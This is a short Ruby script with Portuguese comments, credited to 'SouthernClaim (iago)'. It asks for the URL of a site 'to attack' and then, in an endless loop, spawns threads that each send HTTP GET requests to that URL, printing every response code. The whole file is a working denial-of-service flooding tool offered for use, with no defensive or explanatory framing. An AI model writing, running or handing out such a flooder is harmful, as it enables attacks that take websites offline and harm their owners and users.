## Requisições basicas pra mecher com site
require 'net/http'
require 'uri'
require "colorize" ## Serve pra pintar as mensagens do terminal

## By SouthernClaim (iago)

#Perguntar o site para atacar!
puts "URL do site que deseja Atacar:".colorize(:red)
url = URI(gets.chomp) ## O gets chomp pega oque o usuario digitou !

threads = []
i = 0

loop do  ## Loop pra o programa rodar infinitamente e destruir tua ram
  threads << Thread.new do
    begin
      response = Net::HTTP.get_response(url)
      puts "✅ Requisição ##{i += 1} - Código: #{response.code}".colorize(:green)
    rescue => e
      puts "❌ Erro na requisição ##{i}: #{e.class} - #{e.message}".colorize(:red)
    end
  end
end

